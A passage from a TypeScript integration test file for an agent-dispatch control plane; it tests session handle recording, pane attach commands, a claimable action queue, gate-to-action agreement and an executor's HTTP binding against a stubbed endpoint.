    ...production,
    // Scoped to this item: a dispatch tick sweeps the whole graph, and the subject here is the
    // handle one launch records, not which items the sweep finds.
    snapshot: async () => ({ work: [await reload(item.id)], now: new Date().toISOString() }),
    agents: () => [],
    credentials: async profiles => Object.fromEntries(profiles.map(profile => [profile.name, { available: true, reason: null }])),
    reconcileReviews: async () => ({ reviews: [] }),
    reconcileProducers: async () => ({ producers: [] }),
    // What the real launchers return: the pane of the session they just started. The runtime and
    // the workspace are what this loop launched it into, and it knows both.
    launchReview: async () => ({ pane: 'pane-12' }),
    launchProducer: async () => ({ pane: 'pane-13' }),
    recordSession: async (work, handle) => { handles.push({ key: work.key, handle }); return production.recordSession!(work, handle); },
    persist: async () => {},
  };
  const cursor = emptyDispatchCursor(fleetConfig);
  const tick = await runDispatchTick(fleetConfig, cursor, effects);
  assert.deepEqual(tick.launched.map(entry => entry.kind), ['producer'], `the tick launched ${JSON.stringify(tick.waiting)}`);
  // The proof passes: the control plane asks for the review, and the next tick launches the reviewer.
  const reviewable = await proveHead(await reload(item));
  assert.ok(reviewable.autoDispatch?.review, 'the control plane asked for a review of this head once its proof passed');
  const next = await runDispatchTick(fleetConfig, cursor, effects);
  assert.deepEqual(next.launched.map(entry => entry.kind), ['review'], `the tick launched ${JSON.stringify(next.waiting)}`);
  assert.ok([...tick.launched, ...next.launched].every(entry => entry.work === item.key));
  // Each launch registers its session before the runtime starts and then writes the pane the
  // launcher returned (GY-172 AC-2): two writes to one handle per launch.
  assert.equal(new Set(handles.map(entry => entry.handle.id)).size, 2, 'a handle was recorded for each launch');
  assert.deepEqual(handles.map(entry => [entry.handle.kind, entry.handle.pane ?? null]), [['proof', null], ['proof', 'pane-13'], ['review', null], ['review', 'pane-12']],
    'each registered before its runtime started, then given the pane it runs in');
  assert.deepEqual(mutations.map(mutation => mutation.path.split('/').at(-1)), ['session', 'session', 'session', 'session'], 'each one went to the control plane through the shipped mutation');
  // And a dispatcher built with nothing but a snapshot records them too: the mutation is derived
  // from the configuration the loop already runs on, so no caller can leave the handles out.
  assert.ok(dispatchEffects('/outside', () => fleetConfig, { snapshot: effects.snapshot }).recordSession, 'the handle recording is not a caller\'s option');
  const recorded = (await reload(item)).sessions ?? [];
  const review = recorded.find(handle => handle.kind === 'review')!, proof = recorded.find(handle => handle.kind === 'proof')!;
  assert.deepEqual([review.runtime, review.workspace, review.pane], ['claude', 'wF', 'pane-12']);
  assert.equal(attachCommand(review), 'herdr pane attach pane-12 --workspace wF');
  assert.match(review.subject, /^GY-\d+: review [0-9a-f]{12} \(PR #\d+\)$/);
  assert.deepEqual([proof.runtime, proof.workspace, proof.pane], ['claude', 'wF', 'pane-13']);
  assert.equal(proof.principal, producer.id, 'the launcher names whose session it is, so that session can add its tab and transcript');
  assert.equal(proof.transcript, '/home/producer/.claude/proofs.jsonl', 'and what that session recorded for itself is on the same handle');
  assert.equal(attachCommand(proof), 'herdr pane attach pane-13 --workspace wF');
  assert.match(proof.subject, new RegExp(`${PROOF}`));
  // The handle is keyed on the dispatch request, so a relaunch for the same request updates it
  // rather than leaving two handles for one session.
  assert.equal(review.id, reviewable.autoDispatch!.review!.id);
  assert.equal(launchedSessionHandle('review', reviewable.autoDispatch!.review!, 'subject', 'host-1', undefined, 'claude', 'wF').attach, undefined,
    'a launcher that reports no pane records no attach command it cannot honour');

  // A worker session Herdr reports blocked is waiting on input, not gone: the attempt is recorded
  // as failed with that reason, and the handle stays running — the one moment anybody needs the
  // attach command is this one.
  let waiting = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  waiting = await reload(waiting);
  const blockedConfig = masterConfigSchema.parse({ ...fleetConfig, workers: [{ name: 'claude-worker', principal: worker.id, agentName: 'work-claude', mode: 'launch', kind: 'claude', credentialFile: '/outside/worker.token', approvals: 'auto' }] });
  const daemonEffects: DaemonEffects = {
    closeSession: () => {}, dispatch: async () => ({}), requestProof: () => {}, merge: async () => ({}),
    observeDeployment: async () => ({ source: 'unavailable', sha: null, at: new Date().toISOString(), reason: 'not configured', deployed: [], pending: [] }),
    recordDeployment: async () => ({}), requestSmoke: () => {},
    agents: () => [{ name: 'work-claude', pane_id: 'pane-9', agent_status: 'blocked' } as any],
    credentials: async () => ({ 'claude-worker': { available: true, reason: null } }),
    recordSession: async (work, handle) => engine.execute(executorA, 'session', work.id, handle, randomUUID()),
    snapshot: async () => ({ work: await store.list(), now: new Date().toISOString() }),
    persist: async () => {},
  };
  const cycle = await runCycle(blockedConfig, emptyDaemonState(blockedConfig), daemonEffects);
  const failure = cycle.actions.find(action => action.kind === 'session' && action.work === waiting.key);
  assert.equal(failure?.state, 'failed', 'the attempt is recorded as failed with the reason');
  const blocked = (await reload(waiting)).sessions!.find(handle => handle.id === `${worker.id}:${waiting.epoch}`)!;
  assert.equal(blocked.state, 'running', 'a session waiting at a prompt has not ended');
  assert.equal(attachCommand(blocked), 'herdr pane attach pane-9 --workspace wF', 'and the command that attaches to it still works');
  assert.match(blocked.outcome!, /waiting on input instead of recording a typed request/);
  await engine.execute(worker, 'release', waiting.id, { epoch: waiting.epoch }, randomUUID());
});

// ---- The pure model, exercised directly -------------------------------------------------------

test('integration:typed-next-action — the queue is pure over the snapshot: the same state reconciles to the same rows, and a changed state retires the row that no longer applies', () => {
  const at = '2026-09-20T12:00:00.000Z', clock = Date.parse(at);
  const item = {
    id: 'work-1', key: 'GY-1', title: 'Pure', description: '', type: 'feature', priority: 1, dependencies: [], plannedFiles: ['src/'],
    criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }], policy: { checks: ['test'], review: true }, stage: 'ready', revision: 1, policyRevision: 1,
    createdAt: at, updatedAt: at, stageEnteredAt: at, ready: true, epoch: 0, lease: null, workspaces: [], candidate: null, submission: null,
    reworkRequested: false, scenarioRequirements: [], evidence: [], observation: null, blocker: null, violations: [],
    gates: [{ name: 'ready', passed: true, reasons: [] }, { name: 'build', passed: false, reasons: ['Worker has not submitted implementation for this attempt'] }],
  } as unknown as Work;
  const first = structuredClone(item), second = structuredClone(item);
  const a = reconcileActions(first, [first], new Date(clock));
  const b = reconcileActions(second, [second], new Date(clock + 60_000));
  assert.deepEqual(a.map(entry => entry.action.id), b.map(entry => entry.action.id), 'the row id is a function of the situation, not of the clock');
  assert.deepEqual(a.map(entry => entry.event), ['requested']);
  assert.deepEqual(reconcileActions(first, [first], new Date(clock + 1000)), [], 'an unchanged situation is idempotent');
  assert.equal(nextAction(first, [first], new Date(clock))!.kind, 'dispatch');

  // An executor claims it; a second executor reading the same snapshot finds nothing left.
  const claimed = claimAction([first], { id: 'executor-a', host: 'host-1', principal: 'executor-a' }, new Date(clock + 2000))!;
  assert.equal(claimed.row.state, 'claimed');
  assert.equal(claimAction([first], { id: 'executor-b', host: 'host-2', principal: 'executor-b' }, new Date(clock + 2001)), null);
  assert.deepEqual(openActions([first], new Date(clock + 3000)).map(entry => entry.row.id), []);
  assert.equal(queueSnapshot([first], new Date(clock + 3000)).claimed, 1);

  // The claim expires: the row returns to the queue, and the idle report names it.
  const later = new Date(clock + 2000 + actionClaimMs + 1);
  assert.deepEqual(reconcileActions(first, [first], later).map(entry => entry.event), ['reclaimed']);
  assert.equal(first.actionQueue!.actions[0].state, 'pending');
  assert.equal(idleActionable([first], new Date(clock + 6 * 60_000)).length, 1);
  assert.equal(idleActionable([first], new Date(clock + 60_000)).length, 0);

  // The situation changes: the row that no longer applies is retired, naming what replaced it.
  first.blocker = 'the provider account has no quota left';
  first.gates = [{ name: 'ready', passed: false, reasons: [first.blocker] }];
  const moved = reconcileActions(first, [first], new Date(clock + 7 * 60_000));
  assert.deepEqual(moved.map(entry => entry.event), ['cancelled', 'requested']);
  assert.match(moved[0].action.resolution!, /now needs escalate instead/);
  assert.equal(first.actionQueue!.actions[0].kind, 'escalate');
  assert.equal(first.actionQueue!.history.length, 1);

  // Settling a row nobody claimed, or one claimed by somebody else, is refused.
  const pending = first.actionQueue!.actions[0];
  assert.throws(() => settleAction(first, pending.id, { executor: 'executor-a', principal: 'executor-a' }, 'done', 'no claim', new Date(clock)), /not claimed/);
  assert.throws(() => settleAction(first, 'f'.repeat(32), { executor: 'executor-a', principal: 'executor-a' }, 'done', 'no such row', new Date(clock)), /not open on this work item/);
});

test('integration:typed-next-action — the gate evaluator and the action computation agree on every stage of one item', () => {
  const at = '2026-09-20T12:00:00.000Z';
  const base_: Work = {
    id: 'work-2', key: 'GY-2', title: 'Agreement', description: '', type: 'feature', priority: 2, dependencies: [], plannedFiles: ['src/'],
    criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }], policy: { checks: ['test'], review: true }, stage: 'backlog', revision: 1, policyRevision: 1,
    createdAt: at, updatedAt: at, stageEnteredAt: at, ready: false, epoch: 0, lease: null, workspaces: [], candidate: null, submission: null,
    reworkRequested: false, scenarioRequirements: [], evidence: [], observation: null, blocker: null, violations: [], gates: [],
  } as unknown as Work;
  const evaluated = (overrides: Partial<Work>) => {
    const probe = { ...structuredClone(base_), ...overrides } as Work;
    Object.assign(probe, evaluate(probe, [probe], new Date(at), [15368]));
    return probe;
  };
  // Backlog raises no action: nobody runs "decide this is worth doing".
  const backlog = evaluated({});
  assert.equal(backlog.gates.find(gate => !gate.passed)!.reasons[0], 'Not released from backlog');
  assert.equal(nextAction(backlog, [backlog], new Date(at)), null);
  // Once released, the action always answers the first refusing gate, naming it and its refusal.
  for (const probe of [evaluated({ ready: true }), evaluated({ ready: true, blocker: 'waiting on the provider' })]) {
    const action = nextAction(probe, [probe], new Date(at));
    const failing = probe.gates.find(gate => !gate.passed)!;
    assert.equal(action!.gate, failing.name);
    assert.equal(action!.refusal, failing.reasons[0]);
    assert.equal(action!.kind, refusalAction(probe, failing.name, failing.reasons[0]));
  }
  // An unfinished dependency belongs to the other item: this one names no action at all.
  const dependency = evaluated({ ready: true, id: 'work-3', key: 'GY-3' });
  const dependent = { ...evaluated({ ready: true, dependencies: ['work-3'] }) };
  Object.assign(dependent, evaluate(dependent, [dependent, dependency], new Date(at), [15368]));
  assert.match(dependent.gates.find(gate => gate.name === 'ready')!.reasons[0], /Dependency GY-3 is unfinished/);
  assert.equal(nextAction(dependent, [dependent, dependency], new Date(at)), null);
  assert.equal(nextAction(dependency, [dependent, dependency], new Date(at))!.kind, 'dispatch', 'the dependency is the one that gets dispatched');
});

test('integration:no-llm-in-critical-path — an executor with no handlers claims nothing, and a handler that throws returns its row to the queue with the reason', async () => {
  const log = emptyLog();
  const idle = await runExecutorTick({ id: executorA.id, host: 'host-1' }, { claim: async () => { throw new Error('never called'); }, settle: async () => ({}), handlers: {} });
  assert.deepEqual([idle.result, idle.reason], ['idle', 'this executor has no handler for any action kind']);

  const item = await release(await created());
  const failingHandlers: ExecutorEffects['handlers'] = { dispatch: async action => { log.executed.push({ executor: executorA.id, host: 'host-1', id: action.id, kind: action.kind, attempt: action.attempts, key: action.key }); throw new Error('no worker profile has a logged-in account'); } };
  const failing: ExecutorEffects = {
    claim: request => engine.claimNextAction(executorA, { ...request, work: item.id }, randomUUID()) as ReturnType<ExecutorEffects['claim']>,
    settle: (action, result, reason) => engine.settleClaimedAction(executorA, action.id, { result, reason }, randomUUID()),
    handlers: failingHandlers,
  };
  // The HTTP binding: the only state an executor holds is its credential, and it speaks exactly
  // the two routes the queue offers.
  const calls: { path: string; body: any; key: string }[] = [];
  const bound = executorEffects({ url: 'https://graphyard.example', token: 'executor-token', requestId: () => 'request-1',
    fetcher: (async (input: any, init: any) => { calls.push({ path: String(input), body: JSON.parse(init.body), key: init.headers['Idempotency-Key'] }); return new Response(JSON.stringify({ action: null, open: 0 })); }) as unknown as typeof fetch }, failingHandlers);
  await bound.claim({ host: 'host-1', executor: executorA.id, kinds: ['dispatch'] });
  await bound.settle({ id: 'a'.repeat(32) } as ActionRow, 'failed', 'nothing to launch with');
  assert.deepEqual(calls.map(call => call.path), ['https://graphyard.example/api/actions/claim', `https://graphyard.example/api/actions/${'a'.repeat(32)}/settle`]);
  assert.deepEqual(calls.map(call => call.key), ['request-1', 'request-1']);
  assert.deepEqual(calls[1].body, { result: 'failed', reason: 'nothing to launch with' });

  const result = await runExecutor({ id: executorA.id, host: 'host-1' }, failing, { intervalMs: 1, maxSteps: 1 });
  const step = result.steps[0];
  assert.equal(step.result, 'failed');
  assert.equal(step.reason, 'no worker profile has a logged-in account');
  const after = await reload(item);
  const stalled = rows(after).find(entry => entry.kind === 'dispatch')!;
  assert.equal(stalled.state, 'pending', 'a failed attempt returns the row to the queue');
  assert.equal(stalled.resolution, 'no worker profile has a logged-in account');
  assert.equal(stalled.attempts, 1);
  await engine.execute(operator, 'blocked', after.id, { epoch: 0, reason: null }, randomUUID()).catch(() => {});
});
